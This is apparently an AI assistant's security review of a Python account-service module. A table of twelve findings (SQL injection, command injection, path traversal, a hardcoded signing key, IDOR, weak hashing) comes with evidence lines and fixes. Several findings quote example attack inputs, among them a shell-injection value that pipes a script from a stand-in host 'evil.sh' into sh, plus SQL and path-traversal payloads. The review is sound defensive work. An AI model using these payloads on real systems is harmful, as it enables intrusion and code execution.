Single file, no callers in the directory — so I reviewed it as a trust boundary of its own (the docstring says it backs `/account` HTTP endpoints, so parameters are attacker-influenced).

## Findings

| # | Finding | Evidence | Impact | Priority | Proposed Fix | Risk |
|---|---------|----------|--------|----------|--------------|------|
| 1 | **SQL injection** — `username` interpolated into the query via f-string | `account_service.py:34` | Full DB read/write; `' OR '1'='1` returns the first account, enabling auth bypass through `verify_credentials` | Critical | Parameterize: `"... WHERE username = ?", (username,)` | `CONFIRMED` |
| 2 | **Command injection** — `filename` (and `user_id`) interpolated into a `shell=True` command string | `account_service.py:120-124` | `filename = "x; curl evil.sh \| sh"` executes arbitrary code as the service user | Critical | Drop `shell=True`, pass an argv list: `["python3","tools/export.py","--user",str(user_id),...]` | `CONFIRMED` |
| 3 | **Path traversal** — `os.path.join(EXPORT_DIR, filename)` with no sanitization | `account_service.py:119,126` | `filename="../../etc/passwd"` or an absolute path escapes `EXPORT_DIR`; the file is then read back and returned to the caller (arbitrary file read + arbitrary write) | Critical | Generate the name server-side, or `os.path.basename` + verify `os.path.realpath(dest).startswith(os.path.realpath(EXPORT_DIR) + os.sep)` | `CONFIRMED` |
| 4 | **Hardcoded secret in source** — `SIGNING_KEY = "sk_live_8f2c91ab4e7d6035"` | `account_service.py:19` | Live-prefixed key committed to the repo; leaks via VCS history, images, backups. It is also the password pepper, so disclosure invalidates every stored hash | Critical | Load from env/secret manager, rotate the key, re-hash credentials on next login | `CONFIRMED` |
| 5 | **Plaintext password written to logs** on every successful auth | `account_service.py:60-65` | Credentials in log files/aggregators, readable by anyone with log access; survives in retention and backups | Critical | Remove the `password=%s` field; log only `user` and `at` | `CONFIRMED` |
| 6 | **Missing authorization (IDOR)** — `update_profile` accepts `session_user_id` but never compares it to `target_user_id` | `account_service.py:83-100` | Any authenticated user edits any other account's `email`; combined with a password-reset-by-email flow this is account takeover | Critical | Reject unless `session_user_id == target_user_id` or the actor's role is admin (use the same check as `deactivate_account:160`) | `CONFIRMED` |
| 7 | **Missing authorization (IDOR)** — `get_profile` ignores `session_user_id` | `account_service.py:103-114` | Any authenticated user enumerates every account's email, timezone and `role` by iterating ids | High | Same ownership/admin check before the query | `CONFIRMED` |
| 8 | **Weak password hashing** — single-round unsalted SHA-256 with a shared global pepper | `account_service.py:72-75` | No per-user salt → identical passwords produce identical hashes; GPU-speed offline cracking of a dumped `users` table | High | Migrate to `bcrypt`/`argon2id`/`scrypt` with a per-user salt; rehash on next successful login | `CONFIRMED` |
| 9 | **No authorization on data export** — `export_account_data` takes `user_id` with no session parameter at all | `account_service.py:117` | Caller can export any account's data; there is no in-module control preventing cross-user access | High | Take `session_user_id` and enforce ownership/admin, as the other mutating functions do | `CONFIRMED` |
| 10 | **Password hash leaks out of the data layer** — `find_by_username` selects and returns `password_hash` in the dict | `account_service.py:34,36` | Hash reaches any caller; one careless JSON serialization of the result exposes it in an API response | Medium | Keep the hash inside `verify_credentials`; strip it from the returned dict | `CONFIRMED` |
| 11 | **Non-constant-time hash comparison** — `==` on the digest | `account_service.py:59` | Timing side channel on hash comparison. Low practical yield here, but free to fix | Low | `hmac.compare_digest(account["password_hash"], _hash_password(password))` | `CONFIRMED` |
| 12 | **Email updated without validation** — `update_profile` writes `fields["email"]` raw; `normalize_email` (`:147`) exists but is never called | `account_service.py:86,93-96` | Unvalidated/unnormalized addresses stored; duplicate-identity and header-injection risk downstream | Low | Run `normalize_email` on the `email` field and reject on `None` | `CONFIRMED` |

### Notes
- **Not an issue:** `find_by_id`, `list_recent_signups`, `deactivate_account` and the `UPDATE` in `update_profile` all parameterize correctly; `update_profile`'s column names come from a hardcoded `allowed` set, so line 90's f-string is not injectable. `deactivate_account:160` is the one function with a correct authorization check — use it as the model for #6, #7, #9.
- **Out of scope, flagged only:** `datetime.utcnow()` (`:64,80,134`) is deprecated and returns a naive datetime; `session_expired` raises `TypeError` if `issued_at` is timezone-aware. Availability, not security.
- Fixes #1–#5 are independent and low-risk. #6, #7 and #9 change observable behavior for any caller currently relying on cross-user access and need a caller sweep before landing — no callers exist in this directory, so that sweep has to happen in the repo that imports this module.
